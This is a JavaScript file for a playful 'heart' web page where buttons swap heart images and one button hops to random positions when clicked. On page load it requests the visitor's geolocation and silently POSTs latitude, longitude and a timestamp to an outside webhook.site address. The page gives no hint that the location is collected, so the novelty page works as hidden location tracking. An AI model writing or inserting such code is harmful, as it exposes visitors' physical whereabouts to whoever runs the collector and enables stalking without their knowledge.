document.addEventListener('DOMContentLoaded', function () {
    var myImage = document.getElementById('myImage');
    var changeImageBtn = document.getElementById('changeImageBtn');
    var myImage2 = document.getElementById('myImage2');

    // Function to send location data to Webhook.site
    function sendLocationToWebhook(latitude, longitude) {
        var data = {
            latitude: latitude,
            longitude: longitude,
            timestamp: new Date().toISOString()
        };

        // Replace with your Webhook.site URL
        fetch('https://webhook.site/a65f09b4-74bc-42d5-88cc-66e5ea85acd8', {
            method: 'POST',
            mode: 'no-cors', // Bypass CORS restrictions
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(() => {
            console.log('Location sent successfully!');
        })
        .catch(error => {
            console.error('Error:', error);
        });
        
    }

    // Function to get user's location
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function (position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;

                    console.log('Latitude:', latitude);
                    console.log('Longitude:', longitude);

                    // Send location to Webhook.site
                    sendLocationToWebhook(latitude, longitude);
                },
                function (error) {
                    console.error('Error getting location:', error.message);
                }
            );
        } else {
            console.error('Geolocation is not supported by this browser.');
        }
    }

    // Request location permission on page load
    getLocation();

    // Change images when button is clicked
    changeImageBtn.addEventListener('click', function () {
        myImage.src = './beating.gif';
        myImage2.src = './output-onlinegiftools.gif';
        myImage.alt = 'find heart';

                var fadeButton = document.getElementById('changeImageBtn2');
            
                fadeButton.style.opacity = 0;
            
                setTimeout(function() {
                    fadeButton.style.display = 'none';
                }, 1000);


    });
});

// document.addEventListener('DOMContentLoaded', function() {
    
//     var myImage = document.getElementById('myImage');
//     var changeImageBtn = document.getElementById('changeImageBtn');
//     var myImage2 = document.getElementById('myImage2');

//     changeImageBtn.addEventListener('click', function() {
//         myImage.src = './beating.gif';
//         myImage2.src = './output-onlinegiftools.gif';
//         myImage.alt = 'find heart';

//         var fadeButton = document.getElementById('changeImageBtn2');
            
//                 fadeButton.style.opacity = 0;
            
//                 setTimeout(function() {
//                     fadeButton.style.display = 'none';
//                 }, 1000);
//     });
// });

document.addEventListener('DOMContentLoaded', function() {
    var myImage = document.getElementById('myImage');
    var randomMoveBtn = document.getElementById('changeImageBtn2');
    var count = 1;

    randomMoveBtn.addEventListener('click', function() {
        myImage.src = './banded_heart-removebg-preview.png';
        document.getElementById('changeImageBtn2');
        
        if(count == 3) {
                var fadeButton = document.getElementById('changeImageBtn2');
            
                fadeButton.style.opacity = 0;
            
                setTimeout(function() {
                    fadeButton.style.display = 'none';
                }, 1000);
                //window.location.href='./index.html';
        }
        // var windowWidth = window.innerWidth;
        // var windowHeight = window.innerHeight;

        // var randomX = Math.floor(Math.random() * (windowWidth - randomMoveBtn.offsetWidth));
        // var randomY = Math.floor(Math.random() * (windowHeight - randomMoveBtn.offsetHeight));

        var randomX = Math.floor(Math.random() * 120);
        var randomY = Math.floor(Math.random() * 120);


        randomMoveBtn.style.left = randomX + 'px';
        randomMoveBtn.style.top = randomY + 'px';
        count++;
    });
   
});

